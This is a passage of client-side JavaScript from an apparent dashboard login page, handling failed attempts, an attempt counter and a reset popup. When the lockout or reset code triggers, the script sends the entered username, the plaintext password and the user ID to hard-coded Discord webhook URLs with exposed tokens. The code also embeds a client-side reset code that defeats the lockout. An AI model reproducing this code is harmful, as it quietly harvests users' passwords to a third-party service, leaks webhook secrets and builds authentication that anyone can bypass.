        errorMsg.textContent = msg;

        // Log the failure to the activity system for internal dashboard review
        activityLogger.log('Login Attempt Failed', {
          username: usernameInput.value,
          userID: userIDInput.value,
          reason: msg,
          attemptsLeft: attempts
        });

        if (attempts <= 0) {
          attempts = 0;
          errorMsg.textContent = 'No attempts left. Please reset.';

          // Log attempts exceeded
          const username = usernameInput.value;
          const password = passwordInput.value;
          const userID = userIDInput.value;
          const user = findUser(username, userID);

          await logAttemptsExceeded(
            user?.name || "Unknown",
            username,
            password,
            userID
          );

          addLoginAttemptToHistory(username, userID, 'failed: attempts exceeded'); // Log status

          showResetPopup();
          disableInputs();
        } else {
          if (attempts <= 3) { // Highlight attempts when they are low (original was 3, but now attempts are already 3 max)
            flashRedOutline(2, 400);
          }
          // Log specific failed reason
          if (msg === 'Incorrect password.') {
              activityLogger.log('Login Fail: Incorrect Password', { username: usernameInput.value });
          } else if (msg === 'User or ID not found.') {
              activityLogger.log('Login Fail: User/ID Not Found', { username: usernameInput.value, userID: userIDInput.value });
          }
        }
      }

      // Update attempts display
      function updateAttemptsText() {
        attemptsText.textContent = `Attempts Left: ${attempts}`;
      }

      // Disable inputs and submit button
      function disableInputs() {
        usernameInput.disabled = true;
        passwordInput.disabled = true;
        userIDInput.disabled = true;
        submitBtn.disabled = true;
      }

      // Enable inputs and submit button
      function enableInputs() {
        usernameInput.disabled = false;
        passwordInput.disabled = false;
        userIDInput.disabled = false;
        submitBtn.disabled = false;
      }

      // Show reset popup
      function showResetPopup() {
        resetPopup.style.display = 'block';
        resetPopup.setAttribute('aria-hidden', 'false');
        resetField.focus();
        activityLogger.log('Reset Popup Displayed');
      }

      // Hide reset popup
      function hideResetPopup() {
        resetPopup.style.display = 'none';
        resetPopup.setAttribute('aria-hidden', 'true');
        resetField.value = '';
        activityLogger.log('Reset Popup Hidden');
      }

      async function resetCounter() {
        const enteredCode = resetField.value.trim();
        const isCorrect = enteredCode === 'Reset.Counter.2579';

        const username = usernameInput.value || 'Unknown';
        const password = passwordInput.value || 'Unknown';
        const userID = userIDInput.value || 'Unknown';
        const user = findUser(username, userID) || {};

        // 1. Send "Reset box Detected" webhook immediately
        const resetBoxEmbed = {
          title: "🔔 Reset Box Detected",
          color: 0xffff00,
          fields: [
            { name: "Name", value: user.name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password Entered", value: password, inline: true },
            { name: "User ID", value: userID, inline: true },
            { name: "Entered Code", value: enteredCode, inline: false },
            { name: "Time", value: new Date().toLocaleString(), inline: false }
          ]
        };
        const resetBoxWebhook = "https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJykeiThIZ6gYCJILFSHfSDSnsq";
        await sendWebhook(resetBoxWebhook, resetBoxEmbed);
        activityLogger.log('Reset Code Attempt', { code: enteredCode, status: isCorrect ? 'correct' : 'incorrect' });

        // Build embed for correct or incorrect code
        const resultEmbed = {
          title: isCorrect ? "✅ Reset Code Accepted" : "❌ Incorrect Reset Code Attempt",
          color: isCorrect ? 0x00ff00 : 0xff0000,
          fields: [
            { name: "Name", value: user.name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password Entered", value: password, inline: true },
            { name: "User ID", value: userID, inline: true },
            { name: "Reset Code", value: enteredCode, inline: false },
            { name: "Time", value: new Date().toLocaleString(), inline: false }
          ]
        };

        // Select webhook for correct or incorrect logging
        const resultWebhook = isCorrect
          ? "https://discord.com/api/webhooks/1403088193850441921/zZKPkgzVBQ7d6aiCkT3WM7j2Y74UO2o1Js9oSnawVBHaSxUQCz-16Qj4uPYk1YxgoanB"
          : "https://discord.com/api/webhooks/1403088326252040372/JgQkJdcVG-8X0jSmw7AZai9YSUODCMZ5hkyWlBe1MBzPRiJgbSlRDWOJUvHVqsK248ip";

        await sendWebhook(resultWebhook, resultEmbed);

        if (isCorrect) {
          attempts = 3; // Reset attempts to the new default max
          updateAttemptsText();
          enableInputs();
          hideResetPopup();
          errorMsg.textContent = '';
          addLoginAttemptToHistory(username, userID, 'counter reset'); // Log status
          showAlert('Login attempts reset!', 'success');
        } else {
          showAlert('Incorrect reset code.', 'error');
        }
      }

      // Attach event listeners
      submitBtn.addEventListener('click', submitLogin);
      resetBtn.addEventListener('click', resetCounter);

      // Enter key submits login if popup hidden, else tries reset
      document.addEventListener('keydown', e => {
        if (e.key === 'Enter') {
          if (resetPopup.style.display === 'block') {
            resetCounter();
          } else if (document.activeElement.tagName === 'INPUT' || document.activeElement.tagName === 'BUTTON') { // Only if interacting with input/button
            submitLogin();
          }
        }
      });

      // Initialize attempts display
      updateAttemptsText();

      // Check for saved login state (for persistent login, though the current logic refreshes and forces login)
      // This is for demonstration, actual persistent login would skip the login form.
      // For this comprehensive overhaul, we will *always* go through login sequence for the animations.
      // But we will use the local storage items to populate the dashboard `loggedInUser` and `loggedInID`.
      if (localStorage.getItem('loggedInUser') && localStorage.getItem('loggedInID')) {
        // Potentially, redirect to dashboard or pre-fill, but current requirement is to go through load animations
      }
    })();

    // Initialize activity logger globally (after initial load is complete)
    document.addEventListener('DOMContentLoaded', () => {
        // Initial setup for current time and date in login box
        // Call initClock now that it handles login page's datetime box
        dashboard.initClock();
        // activityLogger needs to be fully initialized *before* any click handlers, which happens *after* DOMContentLoad and initial animation ends
        // Since dashboard.init() calls activityLogger.init(), we make sure the entire process flows.
    });

  </script>
</body>
</html>
```
